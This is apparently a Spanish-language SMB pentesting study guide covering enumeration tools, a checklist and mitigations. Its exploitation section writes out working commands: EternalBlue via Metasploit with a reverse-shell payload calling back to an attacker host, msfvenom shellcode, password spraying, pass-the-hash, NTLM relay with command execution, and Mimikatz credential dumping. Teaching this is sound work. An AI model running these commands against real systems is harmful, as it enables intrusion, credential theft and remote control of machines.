## Índice
1. [¿Qué es SMB?](#qué-es-smb)
2. [Cómo funciona](#cómo-funciona)
3. [Enumeración](#enumeración)
4. [Vectores de Explotación](#vectores-de-explotación)
5. [Versiones Vulnerables](#versiones-vulnerables)
6. [Checklist de Pentesting](#checklist-de-pentesting)

---

## ¿Qué es SMB?

**SMB (Server Message Block)** es un protocolo de red de nivel de aplicación (capas 6-7 del modelo OSI) que permite:

- Compartir archivos y carpetas en red (**shares**)
- Acceso remoto a impresoras
- Administración remota de sistemas Windows

### Historia
- Desarrollado por IBM en los años 80
- Mejorado y popularizado por Microsoft
- Evolucionó de NetBIOS sobre TCP/IP a SMB directo sobre TCP

---

## Cómo funciona

### Puertos por defecto

| Puerto | Protocolo | Descripción |
|--------|-----------|-------------|
| 445/TCP | SMB | SMB directo sobre TCP (moderno) |
| 139/TCP | NetBIOS | NetBIOS sobre TCP/IP (legacy, NBT) |

### Flujo de autenticación
```
┌─────────┐                    ┌─────────┐ 
│ Cliente │ ──1. SMB Request──>│ Servidor│
│         │<─2. Auth Request── │         │
│         │ ──3. Credentials─> │         │ 
│         │<─4. SMB Response── │         │ 
└─────────┘                    └─────────┘
```

1. **SMB Connection Request**: El cliente solicita conexión
2. **Authentication Request**: El servidor pide credenciales
3. **Authentication Response**: El cliente envía credenciales (NTLM/LM/Kerberos)
4. **SMB Connection Response**: Acceso concedido o denegado

---

## Enumeración

### 1. smbclient

```bash
# Listar shares disponibles (null session)
smbclient -L //<IP_TARGET> -N

# Conectarse a un share específico
smbclient //<IP_TARGET>/WorkShares -N

# Con credenciales
smbclient //<IP_TARGET>/share -U username%password
````

**Comandos de smbclient:**

- `ls` - Listar contenido
- `cd` - Cambiar directorio
- `get <archivo>` - Descargar archivo
- `put <archivo>` - Subir archivo
- `exit` - Salir

### 2. enum4linux

```bash
# Enumeración completa
enum4linux -a <IP_TARGET>

# Con credenciales
enum4linux -u admin -p pass123 -a <IP_TARGET>
```

### 3. crackmapexec 


```bash
# Enumerar shares
crackmapexec smb <IP_TARGET> --shares

# Enumerar usuarios
crackmapexec smb <IP_TARGET> --users

# Verificar credenciales válidas
crackmapexec smb <IP_TARGET> -u 'admin' -p 'password123'

# Pass-the-Hash
crackmapexec smb <IP_TARGET> -u Administrator -H <NTLM_HASH> --local-auth
```

### 4. rpcclient

```bash
# Null session
rpcclient -U "" -N <IP_TARGET>

# Comandos útiles
rpcclient $> enumdomusers      # Listar usuarios del dominio
rpcclient $> querydominfo      # Información del dominio
rpcclient $> enumdomgroups     # Listar grupos
```

### 5. Impacket

```bash
# smbclient.py - Interacción con shares
python3 smbclient.py username:password@<IP_TARGET>

# psexec.py - Ejecución remota (requiere credenciales)
python3 psexec.py username:password@<IP_TARGET>

# wmiexec.py - Ejecución vía WMI (más sigiloso)
python3 wmiexec.py username:password@<IP_TARGET>

# lookupsid.py - Enumeración de SID
python3 lookupsid.py username:password@<IP_TARGET>
```

### 6. Nmap Scripts

```bash
# Descubrimiento básico
nmap -p139,445 --script smb-os-discovery <IP>

# Enumerar shares y usuarios
nmap -p139,445 --script smb-enum-shares,smb-enum-users <IP>

# Detectar vulnerabilidades
nmap -p139,445 --script smb-vuln-* <IP>
```

---
## ⚔️ Vectores de Explotación

### 1. Null Sessions / Guest Access

**Descripción**: Shares configurados sin autenticación o con acceso guest/anónimo.

**Detección**:

```bash
smbclient -L //<IP> -N
rpcclient -U "" -N <IP>
```

**Explotación**:

```bash
# Acceder al share
smbclient //<IP>/WorkShares -N

# Navegar y exfiltrar datos
smb: \> ls
smb: \> cd Amy.J
smb: \Amy.J\> get worknotes.txt
smb: \Amy.J\> get flag.txt
```

---

### 2. EternalBlue (MS17-010) 

**Descripción**: Buffer overflow en SMBv1 que permite ejecución remota de código.

**Sistemas afectados**: Windows XP, Vista, 7, 8.1, Server 2003-2012 R2

**Detección**:

```bash
nmap --script smb-vuln-ms17-010 -p445 <IP>
```

**Explotación con Metasploit**:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
exploit
```

**Explotación con AutoBlue** (más silencioso):

```bash
# Generar shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tu_ip> LPORT=4444 -f raw -o shellcode.bin

# Ejecutar exploit
python3 eternalblue_exploit.py <IP> shellcode.bin
```

---

### 3. SMBGhost (CVE-2020-0796) 

**Descripción**: Buffer overflow en SMBv3.1.1 con compresión habilitada.

**Sistemas afectados**:
- Windows 10 Version 1903, 1909
- Windows Server Version 1903, 1909

**Detección**:

```bash
nmap --script smb-vuln-cve-2020-0796 -p445 <IP>
```

**Explotación**:

- Permite RCE (Remote Code Execution)
- Permite LPE (Local Privilege Escalation)

```bash
# Clonar repositorio
git clone https://github.com/danigargu/CVE-2020-0796.git

# Compilar y ejecutar (requiere adaptación según objetivo)
```

---

### 4. Fuerza Bruta de Credenciales

**Hydra**:

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>
```

**Crackmapexec** (password spraying):

```bash
# Spray de contraseñas contra múltiples usuarios
crackmapexec smb <IP_RANGE> -u users.txt -p 'Password123' --continue-on-success

# Fuerza bruta completa
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

**Medusa**:

```bash
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt
```

---

### 5. Pass-the-Hash (PtH)

**Descripción**: Usar hashes NTLM directamente sin necesidad de crackear la contraseña.

**Obtención de hashes**:
- Mimikatz: `sekurlsa::logonpasswords`
- Responder.py (ver sección 6)
- Volcado de SAM

**Explotación**:


```bash
# Crackmapexec
crackmapexec smb <IP> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket psexec
python3 psexec.py -hashes LM:NT administrator@<IP>

# Impacket wmiexec
python3 wmiexec.py -hashes LM:NT administrator@<IP>

# Evil-WinRM (si WinRM está activo)
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

---

### 6. SMB Relay / Man-in-the-Middle

**Descripción**: Interceptar y retransmitir autenticaciones SMB para obtener acceso.

**Responder.py** (captura de hashes):

```bash
# Iniciar escucha en la interfaz de red
sudo responder -I eth0 -wrfv

# Opciones:
# -w: Iniciar servidor WPAD
# -r: Responder a peticiones NetBIOS
# -f: Fingerprinting
# -v: Verbose
```

**ntlmrelayx.py** (relay de autenticación):

```bash
# Configurar relay hacia un objetivo específico
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Con ejecución de comandos
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Con shell interactiva
python3 ntlmrelayx.py -tf targets.txt -smb2support -i
```

**Mitigación**: Habilitar SMB signing en todos los sistemas.

---

### 7. Enumeración de Shares Sensibles

**Shares administrativos por defecto**:

- `ADMIN$` - Acceso administrativo al sistema (C:\Windows)
- `C$` - Acceso a disco C:\
- `IPC$` - Comunicación inter-procesos (no browsable)

**Shares personalizados** (objetivo principal):

- Frecuentemente mal configurados
- Pueden contener:
    - Credenciales expuestas
    - Backups de bases de datos
    - Archivos de configuración (.config, .ini, .xml)
    - Scripts con contraseñas hardcodeadas

---

## 📊 Versiones Vulnerables

|Versión SMB|Sistema Operativo|Estado de Seguridad|
|:--|:--|:--|
|**SMB 1.0 (CIFS)**|Windows XP, 2003, Vista, 7, 2008|🔴 **Crítico** - EternalBlue, desactivar|
|**SMB 2.0**|Windows Vista, 2008|🟡 Obsoleto, actualizar|
|**SMB 2.1**|Windows 7, 2008 R2|🟡 Obsoleto, actualizar|
|**SMB 3.0**|Windows 8, Server 2012|🟡 Parchear regularmente|
|**SMB 3.0.2**|Windows 8.1, Server 2012 R2|🟡 Parchear regularmente|
|**SMB 3.1.1**|Windows 10, Server 2016+|🟢 Actual, pero SMBGhost si no parcheado|

### Comandos para verificar versión:
  
```bash
# Nmap
nmap -p445 --script smb-protocols <IP>

# Crackmapexec (muestra versión y firmado)
crackmapexec smb <IP>

# smbclient
smbclient -L //<IP> -N  # Muestra versión en la conexión
```

---

## ✅ Checklist de Pentesting SMB

### Fase 1: Descubrimiento

- [ ] Escaneo de puertos 139 y 445
- [ ] Identificar versión del sistema operativo
- [ ] Determinar versión de SMB soportada

### Fase 2: Enumeración

- [ ] Intentar null session: `smbclient -L //<IP> -N`
- [ ] Listar shares: `crackmapexec smb <IP> --shares`
- [ ] Enumerar usuarios: `enum4linux -U <IP>`
- [ ] Revisar permisos en shares accesibles
- [ ] Buscar archivos sensibles en shares

### Fase 3: Vulnerabilidades

- [ ] Escaneo MS17-010 (EternalBlue)
- [ ] Escaneo CVE-2020-0796 (SMBGhost)
- [ ] Verificar SMB signing deshabilitado (para relay)
- [ ] Verificar SMBv1 habilitado

### Fase 4: Explotación

- [ ] Fuerza bruta de credenciales si es necesario
- [ ] Pass-the-Hash si se obtienen hashes
- [ ] SMB Relay si no hay signing
- [ ] Explotación de vulnerabilidades críticas

### Fase 5: Post-Explotación

- [ ] Escalada de privilegios
- [ ] Movimiento lateral
- [ ] Exfiltración de datos
- [ ] Persistencia

---

## 🛡️Mitigación

1. **Deshabilitar SMBv1** en todos los sistemas
2. **Habilitar SMB signing** para prevenir ataques de relay
3. **Segmentar la red** para limitar el alcance de SMB
4. **Principio de mínimo privilegio** en shares
5. **Auditoría regular** de permisos de shares
6. **Mantener sistemas actualizados** con parches de seguridad